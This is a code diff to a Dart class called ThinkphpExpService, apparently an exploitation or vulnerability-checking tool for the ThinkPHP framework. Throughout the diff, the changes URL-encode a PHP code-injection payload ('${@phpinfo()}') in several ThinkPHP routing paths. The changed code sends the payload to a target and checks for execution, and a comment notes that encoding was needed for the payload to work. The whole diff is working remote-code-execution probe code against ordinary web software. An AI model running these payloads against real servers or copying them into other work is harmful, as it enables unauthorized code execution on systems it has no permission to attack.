@@ -146,9 +146,11 @@ class ThinkphpExpService {
   Future<ThinkphpResult> checkTp2() async {
     Object? lastError;
     var anyResponse = false;
+    // ${...} 必须编码，否则服务端收不到（实测未编码时无回显）。
+    final phpin = Uri.encodeComponent(r'${@phpinfo()}');
     final urls = [
-      '${baseUri}index.php?s=/index/index/name/\${@phpinfo()}',
-      '$baseUri?s=/index/index/name/\${@phpinfo()}',
+      '${baseUri}index.php?s=/index/index/name/$phpin',
+      '${baseUri}?s=/index/index/name/$phpin',
     ];
     for (final u in urls) {
       try {
@@ -179,8 +181,9 @@ class ThinkphpExpService {
     Object? lastError;
     var anyResponse = false;
     final mod = await _getModule();
+    final phpin = Uri.encodeComponent(r'${@phpinfo()}');
     final payload =
-        '${baseUri}?s=$mod/\\think\\Module/Action/Param/\${@phpinfo()}';
+        '${baseUri}?s=$mod/\\think\\Module/Action/Param/$phpin';
     try {
       final res = await http.get(Uri.parse(payload)).timeout(timeout);
         anyResponse = true;
@@ -199,8 +202,9 @@ class ThinkphpExpService {
     Object? lastError;
     var anyResponse = false;
     final mod = await _getModule();
+    final phpin = Uri.encodeComponent(r'${@phpinfo()}');
     final payload =
-        '${baseUri}?s=$mod/\\think\\module/aciton/param1/\${@phpinfo()}';
+        '${baseUri}?s=$mod/\\think\\module/aciton/param1/$phpin';
     try {
       final res = await http.get(Uri.parse(payload)).timeout(timeout);
         anyResponse = true;
